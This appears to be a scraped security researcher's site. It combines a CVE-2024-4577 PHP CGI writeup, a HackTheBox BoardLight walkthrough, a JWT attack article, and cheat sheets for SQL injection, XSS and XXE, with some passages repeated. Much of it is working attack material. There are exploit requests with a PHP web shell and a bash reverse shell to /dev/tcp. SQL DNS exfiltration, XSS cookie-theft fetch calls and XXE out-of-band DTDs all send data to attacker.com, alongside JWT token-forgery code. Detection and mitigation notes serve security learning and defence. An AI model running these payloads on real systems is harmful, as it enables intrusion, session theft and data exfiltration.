docs.text: About Hi, I'm Hans_Moleman.PNG — security researcher focused on AppSec and vulnerability research. I spend most of my time looking for bugs in web applications, hunting CVEs, and doing CTFs when I should be sleeping. Areas I work in: Web application security Penetration testing Vulnerability research & disclosure CTF (HackTheBox, HTB Pro Labs) Contact X / Twitter GitHub HackTheBox Email

docs.text: CVE 2026-03-06 CVE-2024-4577: PHP CGI Argument Injection on Windows Overview CVE-2024-4577 is a critical vulnerability (CVSS 9.8) in PHP that affects Windows systems running PHP in CGI mode. It was disclosed in June 2024 and affects PHP versions 8.1 < 8.1.29, 8.2 < 8.2.20, and 8.3 < 8.3.8. The vulnerability is a bypass of the fix for CVE-2012-1823 , a well-known PHP CGI argument injection from 2012. Due to the way Windows handles character encoding with the "Best-Fit" feature, an attacker can inject arguments directly into the PHP binary, achieving unauthenticated remote code execution. Field Value CVE CVE-2024-4577 CVSS 9.8 Critical Affected PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 Attack vector Network (unauthenticated) Patch PHP 8.1.29 / 8.2.20 / 8.3.8 Root Cause The original CVE-2012-1823 was patched by blocking query strings that start with - characters (which would be interpreted as CLI arguments by the PHP binary). However, this fix relied on exact character matching. On Windows, when using code pages like 932 (Japanese Shift-JIS), certain multi-byte characters include 0xAD as a trailing byte — which Windows "Best-Fit" mapping silently normalizes to 0x2D (the - character). This normalization happens after the security check, allowing the restriction to be bypassed. Attacker sends: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input Windows normalizes: /?-d+allow_url_include=1+-d+auto_prepend_file=php://input PHP CGI processes: php.exe -d allow_url_include=1 -d auto_prepend_file=php://input Exploitation The attack is straightforward. The attacker sends a crafted GET request to a PHP CGI endpoint, injecting -d arguments to enable allow_url_include and set auto_prepend_file to php://input . The POST body contains the PHP payload. POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1 Host: target.example.com Content-Type: application/x-www-form-urlencoded <?php system($_GET['cmd']); ?> Execution then via: GET /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input&cmd=whoami HTTP/1.1 Several XAMPP configurations on Windows are vulnerable by default — XAMPP sets PHP to run in CGI mode and serves it on localhost, but many deployments expose it externally or on internal networks accessible to attackers. Impact Unauthenticated RCE on any PHP CGI deployment on Windows XAMPP default installations are vulnerable out of the box Multiple threat actors and ransomware groups exploited this within days of disclosure CISA added it to the Known Exploited Vulnerabilities catalog Detection Look for HTTP requests containing encoded dashes ( %AD , %2D ) in the query string followed by PHP ini directives: %ADd, %2Dd, -%64 (all decode to -d) allow_url_include, auto_prepend_file, auto_append_file Web server logs with requests like /?%ADd+allow_url_include are a strong indicator of exploitation attempts. Mitigation Update PHP to 8.1.29, 8.2.20, or 8.3.8 Avoid CGI mode — use PHP-FPM or mod_php instead For XAMPP, apply the vendor-provided patch or restrict external access References PHP Security Advisory Original researcher writeup by DEVCORE NVD entry
docs.title: CVE-2024-4577: PHP CGI Argument Injection on Windows

It was disclosed in June 2024 and affects PHP versions 8.1 < 8.1.29, 8.2 < 8.2.20, and 8.3 < 8.3.8. The vulnerability is a bypass of the fix for CVE-2012-1823 , a well-known PHP CGI argument injection from 2012. docs.text: The original CVE-2012-1823 was patched by blocking query strings that start with - characters (which would be interpreted as CLI arguments by the PHP binary). However, this fix relied on exact character matching. On Windows, when using code pages like 932 (Japanese Shift-JIS), certain multi-byte characters include 0xAD as a trailing byte — which Windows "Best-Fit" mapping silently normalizes to 0x2D (the - character). This normalization happens after the security check, allowing the restriction to be bypassed. Attacker sends: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input Windows normalizes: /?-d+allow_url_include=1+-d+auto_prepend_file=php://input PHP CGI processes: php.exe -d allow_url_include=1 -d auto_prepend_file=php://input

The POST body contains the PHP payload. POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1 Host: target.example.com Content-Type: application/x-www-form-urlencoded <?php system($_GET['cmd']); ?> Execution then via: GET /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input&cmd=whoami HTTP/1.1 Several XAMPP configurations on Windows are vulnerable by default — XAMPP sets PHP to run in CGI mode and serves it on localhost, but many deployments expose it externally or on internal networks accessible to attackers.

docs.text: Writeup 2026-03-06 HTB BoardLight — Writeup Difficulty: Easy OS: Linux Release: 2024-05-11 Recon Start with a port scan: nmap -sC -sV -oN nmap/initial 10.10.11.11 22/tcp open ssh OpenSSH 8.2p1 80/tcp open http Apache httpd 2.4.41 The web server at port 80 shows a corporate landing page for "BoardLight". Nothing interesting in the visible content, but subdomain enumeration finds something: ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \ -u http://board.htb/ -H "Host: FUZZ.board.htb" -fs 15949 crm [Status: 200, Size: 6360] Initial Access — Dolibarr ERP (CVE-2023-30253) The subdomain crm.board.htb runs Dolibarr ERP 17.0.0 . Default credentials work: admin:admin Dolibarr 17.0.0 is vulnerable to CVE-2023-30253 , a PHP code injection via the website module. The CMS page editor allows creating .php files but tries to block <?php tags. The bypass is trivial — use <?PHP (uppercase): <?PHP system($_GET['cmd']); ?> Create a new website, add a page, inject the payload in the page template, then request it: http://crm.board.htb/htdocs/public/website/index.php?website=test&pageref=shell&cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data) Upgrade to a reverse shell: # Listener nc -lvnp 4444 # Payload (URL encoded) bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1' Lateral Movement — User Enumerate the Dolibarr config: cat /var/www/html/crm.board.htb/htdocs/conf/conf.php $dolibarr_main_db_pass='ServicesHubADM!'; Try the password for the local users: cat /etc/passwd | grep -v nologin | grep -v false # larissa:x:1000:1000::/home/larissa:/bin/bash su - larissa # password: ServicesHubADM! Grab user.txt . Privilege Escalation — enlightenment_sys SUID Look for SUID binaries: find / -perm -4000 -type f 2>/dev/null /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys The installed version of the enlightenment window manager is vulnerable to a local privilege escalation via enlightenment_sys . The binary takes a path argument and passes it to mount as root without proper sanitization. /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \ /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \ "/dev/../tmp/;/tmp/exploit" Where /tmp/exploit is: #!/bin/bash chmod +s /bin/bash After execution: /bin/bash -p # bash-5.0# id # uid=1000(larissa) gid=1000(larissa) euid=0(root) egid=0(root) Grab root.txt . Summary Step Technique Recon Subdomain enumeration → crm.board.htb Initial access Dolibarr default creds + CVE-2023-30253 PHP injection Lateral movement Password reuse from Dolibarr config Privesc Vulnerable SUID enlightenment_sys binary
docs.title: HTB BoardLight — Writeup

docs.text: Research 2026-03-06 JWT Algorithm Confusion Attacks Algorithm confusion (also called key confusion) is one of the most dangerous JWT vulnerabilities. When exploitable, it typically gives you the ability to forge arbitrary tokens and impersonate any user, including admins. Despite being well-documented since 2015, it still shows up regularly. Background: RS256 vs HS256 JWTs can be signed with different algorithms: HS256 — HMAC-SHA256, symmetric. The same secret key is used to sign and verify. RS256 — RSA-SHA256, asymmetric. A private key signs; the public key verifies. The algorithm is specified in the token header: { "alg": "RS256", "typ": "JWT" } The Vulnerability The attack works when: The server signs tokens with RS256 (private key) The server's JWT library accepts both RS256 and HS256 The library uses the public key as-is when HS256 is specified If an attacker changes alg from RS256 to HS256 , some libraries will verify the signature using the public key as the HMAC secret . Since the public key is, well, public — the attacker can sign arbitrary tokens. Server expects RS256: verify(token, publicKey) Attacker sends HS256: verify(token, publicKey) ← same call, different interpretation The root cause is usually a verification function like: # Vulnerable jwt.decode(token, public_key) # trusts the header's alg field # Safe jwt.decode(token, public_key, algorithms=["RS256"]) # explicitly restrict algorithms Finding the Public Key To forge a token you need the server's RSA public key. Common sources: JWKS endpoint — /.well-known/jwks.json , /api/auth/jwks Embedded in responses — some apps return it in auth flows Derivation from two tokens — using rsa_sign2n or similar tools, you can derive the public key from two RS256-signed tokens # Derive public key from two tokens git clone https://github.com/silentsignal/rsa_sign2n python3 rsa_sign2n/standalone/jwt_forgery.py token1 token2 Exploitation Once you have the public key, forge a token with an elevated role: import jwt public_key = open("public.pem").read() payload = { "sub": "1337", "username": "admin", "role": "administrator", "iat": 1700000000, "exp": 9999999999 } forged = jwt.encode(payload, public_key, algorithm="HS256") print(forged) Use the forged token in the Authorization: Bearer header and observe the response. Testing Checklist When assessing a JWT implementation: [ ] Check the alg header — is it RS256/ES256 or symmetric? [ ] Try changing alg to HS256 and re-signing with the public key [ ] Try alg: none (no signature required) [ ] Look for a JWKS endpoint and retrieve the public key [ ] Test if the kid header allows path traversal or SQL injection [ ] Check token expiry is enforced ( exp claim) [ ] Verify the aud (audience) claim is validated Mitigation For developers: Always explicitly specify allowed algorithms when verifying: jwt.decode(token, key, algorithms=["RS256"]) Use a well-maintained JWT library and keep it updated Reject tokens with alg: none Pin the expected algorithm in config, not at runtime Detection: - Log JWT verification failures including the algorithm claimed - Alert on alg: none or unexpected algorithm changes from the same client Tools Tool Use jwt.io Decode and inspect JWTs jwt_tool Automated JWT attack testing rsa_sign2n Derive public key from token pairs Burp Suite JWT Editor In-proxy token manipulation References PortSwigger Web Security Academy — JWT attacks RFC 7518 — JSON Web Algorithms Auth0 — Critical vulnerabilities in JWT libraries (2015)
docs.title: JWT Algorithm Confusion Attacks

When exploitable, it typically gives you the ability to forge arbitrary tokens and impersonate any user, including admins. Despite being well-documented since 2015, it still shows up regularly.

Common sources: JWKS endpoint — /.well-known/jwks.json , /api/auth/jwks Embedded in responses — some apps return it in auth flows Derivation from two tokens — using rsa_sign2n or similar tools, you can derive the public key from two RS256-signed tokens # Derive public key from two tokens git clone https://github.com/silentsignal/rsa_sign2n python3 rsa_sign2n/standalone/jwt_forgery.py token1 token2

[ ] Try changing alg to HS256 and re-signing with the public key [ ] Try alg: none (no signature required) [ ] Look for a JWKS endpoint and retrieve the public key [ ] Test if the kid header allows path traversal or SQL injection [ ] Check token expiry is enforced ( exp claim) [ ] Verify the aud (audience) claim is validated

docs.text: For developers: Always explicitly specify allowed algorithms when verifying: jwt.decode(token, key, algorithms=["RS256"]) Use a well-maintained JWT library and keep it updated Reject tokens with alg: none Pin the expected algorithm in config, not at runtime Detection: - Log JWT verification failures including the algorithm claimed - Alert on alg: none or unexpected algorithm changes from the same client

docs.text: Writeup 2026-03-05 XXE Injection Deep Dive Overview XML External Entity (XXE) is a vulnerability that occurs when XML parsers process external entities without proper restrictions. Impact Local file disclosure SSRF Denial of Service Example payload <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <foo>&xxe;</foo>
docs.title: XXE Injection Deep Dive

docs.text: Cryptography Cryptographic attacks, weak implementations, token forgery, and encoding tricks.
docs.title: Cryptography

docs.text: Cryptographic attacks, weak implementations, token forgery, and encoding tricks.
docs.title: Cryptography

docs.text: JSON Web Tokens (JWT) Structure header.payload.signature eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 .eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c Each part is Base64URL encoded (no padding, - instead of + , _ instead of / ). Attack 1 — alg: none Strip the signature entirely: import base64, json header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=') payload = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).rstrip(b'=') token = header.decode() + '.' + payload.decode() + '.' Accepted by libraries that don't explicitly disallow none . Attack 2 — Algorithm confusion (RS256 → HS256) If the server uses RS256 and the public key is known, re-sign as HS256 using the public key as the HMAC secret. import jwt public_key = open('public.pem').read() forged = jwt.encode({"sub":"1","role":"admin"}, public_key, algorithm="HS256") Works when the library trusts the alg header without restriction. Attack 3 — Weak secret (brute force) # hashcat hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt # jwt_tool python3 jwt_tool.py <token> -C -d rockyou.txt Common weak secrets: secret , password , 123456 , app name, empty string. Attack 4 — kid header injection The kid (key ID) field is used to look up the signing key. If it's passed to a filesystem lookup or SQL query: { "alg": "HS256", "kid": "../../dev/null" } An empty file read → secret is empty string → sign with "" . { "alg": "HS256", "kid": "' UNION SELECT 'attacker_secret' --" } SQL injection → control the signing key. Attack 5 — jwks_uri spoofing If the server fetches the public key from a URL in the token header ( jku , x5u ): { "alg": "RS256", "jku": "https://attacker.com/jwks.json" } Host your own JWKS with a key pair you control. Quick decode # Decode without verification (inspect only) python3 -c " import sys, base64, json t = sys.argv[1].split('.') for p in t[:2]: p += '==' try: print(json.loads(base64.urlsafe_b64decode(p))) except: pass " <token> Mitigations Risk Fix alg: none Explicitly whitelist allowed algorithms Alg confusion Pin algorithm: jwt.decode(t, key, algorithms=["RS256"]) Weak secret Use 256-bit random secret for HS256 kid injection Validate and sanitize kid; don't use in DB queries jku / x5u spoofing Pin or whitelist JWKS URLs
docs.title: JSON Web Tokens (JWT)

Accepted by libraries that don't explicitly disallow none .

docs.title: Web Security

docs.text: SQL Injection Detection -- Single quote error test ' '' ` -- Boolean tests ' AND 1=1 -- ' AND 1=2 -- -- Time-based '; WAITFOR DELAY '0:0:5' -- (MSSQL) ' AND SLEEP(5) -- (MySQL) ' AND 1=(SELECT 1 FROM pg_sleep(5)) -- (PostgreSQL) Error-based / Union -- Find column count ' ORDER BY 1 -- ' ORDER BY 2 -- ...until error -- Union injection ' UNION SELECT NULL, NULL, NULL -- ' UNION SELECT 1, user(), database() -- -- Extract tables (MySQL) ' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() -- -- Extract columns ' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' -- -- Dump data ' UNION SELECT username,password,3 FROM users -- Blind (Boolean-based) -- Determine DB version length ' AND LENGTH(version())=8 -- -- Extract char by char ' AND SUBSTR(version(),1,1)='8' -- ' AND ASCII(SUBSTR(password,1,1))>100 -- Time-based blind -- MySQL ' AND IF(1=1, SLEEP(5), 0) -- ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) -- -- PostgreSQL '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -- MSSQL '; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5' -- Out-of-band (OOB) -- MySQL: DNS exfil via LOAD_FILE (requires file_priv) SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x')) -- MSSQL: DNS via linked server EXEC master..xp_dirtree '\\attacker.com\share' sqlmap quick reference # Basic detection sqlmap -u "http://target/page?id=1" --batch # Full dump sqlmap -u "http://target/page?id=1" --batch --dump-all # With cookies (authenticated) sqlmap -u "http://target/page?id=1" --cookie "session=abc123" --batch # POST request sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch # Level and risk (higher = more aggressive) sqlmap -u "..." --level=5 --risk=3 # Second-order SQLi sqlmap -u "http://target/profile" --second-url "http://target/display" --batch WAF bypass techniques Technique Example Case variation SeLeCt , uNiOn Comments SE/**/LECT , UN--\nION URL encoding %55NION (U→%55) Double encoding %2555NION Whitespace alternatives SELECT%09 , SELECT%0a Inline comment /*!UNION*/ (MySQL)
docs.title: SQL Injection

docs.title: Time-based blind

docs.text: -- MySQL: DNS exfil via LOAD_FILE (requires file_priv) SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x')) -- MSSQL: DNS via linked server EXEC master..xp_dirtree '\\attacker.com\share'
docs.title: Out-of-band (OOB)

docs.text: # Basic detection sqlmap -u "http://target/page?id=1" --batch # Full dump sqlmap -u "http://target/page?id=1" --batch --dump-all # With cookies (authenticated) sqlmap -u "http://target/page?id=1" --cookie "session=abc123" --batch # POST request sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch # Level and risk (higher = more aggressive) sqlmap -u "..." --level=5 --risk=3 # Second-order SQLi sqlmap -u "http://target/profile" --second-url "http://target/display" --batch

docs.title: WAF bypass techniques

docs.text: Cross-Site Scripting (XSS) Types Type Sink Persistence Reflected Server response None Stored Database / file Permanent DOM-based Client-side JS None Payload starters ';alert(1)// "-alert(1)-" ${alert(1)} <script>alert(1)</script> ← won't work ← actual bypass if entity decoding happens before sink CSP bypass techniques default-src 'self' script-src 'unsafe-inline' — inline scripts allowed script-src 'nonce-xxx' — if nonce is reused or predictable script-src cdn.example.com — find JSONP/Angular on whitelisted domains script-src 'strict-dynamic' — inject trusted script that loads your payload {{constructor.constructor('alert(1)')()}} DOM sinks to watch document.write() innerHTML / outerHTML eval() / setTimeout() / setInterval() with string arg location.href element.src / element.action jQuery: $(), .html(), .after() Steal cookies / session // Via fetch to attacker server fetch('https://attacker.com/?c=' + document.cookie) // Via img new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie) // XSS + CSRF combo: change email fetch('/api/user', {method:'POST', body:'email=attacker@evil.com', credentials:'include'}) Filter bypass cheatsheet Block Bypass
docs.title: Cross-Site Scripting (XSS)

docs.text: Type Sink Persistence Reflected Server response None Stored Database / file Permanent DOM-based Client-side JS None
docs.title: Types

docs.text: ';alert(1)// "-alert(1)-" ${alert(1)} <script>alert(1)</script> ← won't work ← actual bypass if entity decoding happens before sink
docs.title: Payload starters

docs.text: default-src 'self' script-src 'unsafe-inline' — inline scripts allowed script-src 'nonce-xxx' — if nonce is reused or predictable script-src cdn.example.com — find JSONP/Angular on whitelisted domains script-src 'strict-dynamic' — inject trusted script that loads your payload <!-- JSONP bypass (if jsonp endpoint on allowed domain) --> <script src="https://allowed.com/jsonp?callback=alert(1)//"></script> <!-- Angular (if Angular loaded from allowed domain) --> {{constructor.constructor('alert(1)')()}}
docs.title: CSP bypass techniques

docs.text: document.write() innerHTML / outerHTML eval() / setTimeout() / setInterval() with string arg location.href element.src / element.action jQuery: $(), .html(), .after()
docs.title: DOM sinks to watch

docs.text: // Via fetch to attacker server fetch('https://attacker.com/?c=' + document.cookie) // Via img new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie) // XSS + CSRF combo: change email fetch('/api/user', {method:'POST', body:'email=attacker@evil.com', credentials:'include'})
docs.title: Steal cookies / session

docs.text: Block Bypass <script> filtered <ScRiPt> , <script/src=...> Quotes filtered Use String.fromCharCode or backticks alert filtered confirm(1) , prompt(1) , console.log Spaces filtered <img/src=x/onerror=alert(1)> javascript: filtered jAvAsCrIpT: , javascript:
docs.title: Filter bypass cheatsheet

docs.text: XML External Entity (XXE) Basic file read <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <foo>&xxe;</foo> SSRF via XXE <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]> <foo>&xxe;</foo> Blind XXE — OOB via DTD When the response doesn't reflect the entity, use an out-of-band channel. External DTD (hosted on attacker server at http://attacker.com/evil.dtd ): <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % wrap "<!ENTITY % send SYSTEM 'http://attacker.com/?data=%file;'>"> %wrap; %send; Payload in the request: <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]> <foo>x</foo> Error-based XXE If the app reflects XML parsing errors: <!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % wrap "<!ENTITY % err SYSTEM 'file:///nonexistent/%file;'>"> %wrap; %err; ]> The file content appears in the error message. PHP filter — base64 encode to bypass newline issues <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> Common attack vectors Input Vector XML request body Classic XXE File upload (SVG) <svg> with XML declaration File upload (XLSX/DOCX) ZIP → XML files inside SOAP API XML SOAP body RSS/Atom feed parsing External entity in feed SVG example: <?xml version="1.0" standalone="yes"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <svg xmlns="http://www.w3.org/2000/svg"> <text>&xxe;</text> </svg> Mitigation Disable external entities in the XML parser (default in most modern parsers if configured) Use defusedxml in Python, FEATURE_DISALLOW_DOCTYPE_DECL in Java Input validation on file uploads (check magic bytes, not just extension)
docs.title: XML External Entity (XXE)
